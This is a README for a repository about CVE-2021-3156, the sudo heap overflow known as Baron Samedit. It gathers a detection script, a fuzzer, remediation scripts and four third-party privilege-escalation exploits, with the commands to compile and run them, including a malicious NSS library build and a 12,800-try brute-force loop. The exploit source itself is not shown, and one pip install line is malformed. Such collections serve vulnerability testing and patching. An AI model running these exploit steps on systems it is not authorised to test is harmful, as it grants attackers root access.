# CVE-2021-3156 README.md

## CVE-2021-3156-POC
    chmod +x CVE-2021-3156-POC.sh
    ./CVE-2021-3156-POC.sh
    
        This script (v1.0) is primarily designed to detect CVE-2021-3156 on supported
        Red Hat Enterprise Linux systems and kernel packages.
        Result may be inaccurate for other RPM based systems.

        Detected 'sudo' package: sudo-1.8.23-10.el7.x86_64
        This sudo version is vulnerable.
        Follow https://access.redhat.com/security/vulnerabilities/RHSB-2021-002 for advice.


## CVE-2021-3156_fuzzy
    pip3 install -y requirements.txt
    python3 CVE-2021-3156_fuzzy.py
    
## exploit
#### exploit0
    gcc -s -o exploit exploit.c -Wall -Werror -Wextra
    mkdir libnss_X
    gcc -fpic -shared -nostdlib -o libnss_X/X.so.2 call.c
    for i in {1..12800}; do echo -n "try number $i "; ./exploit; done
Source: https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156

#### exploit1
	make
	./sudo-hax-me-a-sandwich

#### exploit2
	chmod +x exp.sh
	./exp.sh
Source: https://github.com/ltfafei/CVE-Exploits/tree/master/CVE-2021-3156

#### exploit3    
	gcc exploit.c -o exploit
	cp /etc/passwd /opt/passwd
	./exploit
Source: https://github.com/stong/CVE-2021-3156

## Repaire_CVE-2021-3156
#### Remission_CVE-2021-3156.sh
    chmod +x Remission_CVE-2021-3156.sh  && ./Remission_CVE-2021-3156.sh

#### All_Linux_upgrade-Sudo_for-cve-2021-3156-repaire.sh
    chmod +x All_Linux_upgrade-Sudo_for-cve-2021-3156-repaire.sh
    ./All_Linux_upgrade-Sudo_for-cve-2021-3156-repaire.sh
    
        ...
        **********************************************

        Sudo version 1.8.23

        Your Sudo upgrade success!
        **********************************************
        [root@server ~]# sudo -V |grep "Sudo" |sed -n '1p'
          Sudo version 1.9.5p2
        [root@server ~]# 

Source:
    https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
    https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
    https://access.redhat.com/sites/default/files/cve-2021-3156--2021-01-26-1453.sh
    https://twitter.com/gf_256/status/1355354178588180481
    
Details of the article for CVE-2021-3156: https://blog.csdn.net/qq_41490561/article/details/113437166
